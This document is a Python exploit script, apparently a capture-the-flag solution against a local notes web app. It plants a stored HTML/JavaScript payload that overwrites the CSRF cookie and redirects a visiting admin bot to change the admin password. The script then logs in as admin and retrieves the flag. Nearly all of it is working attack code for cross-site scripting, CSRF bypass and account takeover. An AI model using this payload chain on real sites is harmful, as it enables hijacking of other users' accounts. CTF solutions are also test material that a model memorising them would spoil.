import requests, sys, re, time, os

APP = "http://localhost:7777"
BOT = os.environ.get("BOT_URL", "http://localhost:8888")

U = "pwner1337"
P = "hunter2"

def main():
    s = requests.Session()
    r = s.post(APP + "/register", data={"username": U, "password": P})
    if "taken" in r.text:
        s.post(APP + "/login", data={"username": U, "password": P})

    c = s.cookies.get("csrf_token")
    print("csrf:", c)

    e = f"""<img src="{APP}/cookie/set?name=csrf_token&value={c}">
<script>
setTimeout(function() {{
  window.location = "{APP}/change-password?password=pwned123&csrf_token={c}";
}}, 1500);
</script>"""

    s.post(APP + "/create", data={"title": "check this out", "content": e})
    m = re.search(r'/notes/(\d+)', s.get(APP + "/dashboard").text)
    nid = m.group(1)
    u = f"{APP}/notes/{nid}"
    print("exploit:", u)

    requests.post(BOT + "/report", data={"url": u})
    time.sleep(5)

    s2 = requests.Session()
    r = s2.post(APP + "/login", data={"username": "admin", "password": "pwned123"})
    if "wrong" in r.text:
        print("rip")
        sys.exit(1)

    print("flag:", s2.get(APP + "/flag", params={"password": "pwned123"}).text.strip())

if __name__ == "__main__":
    main()
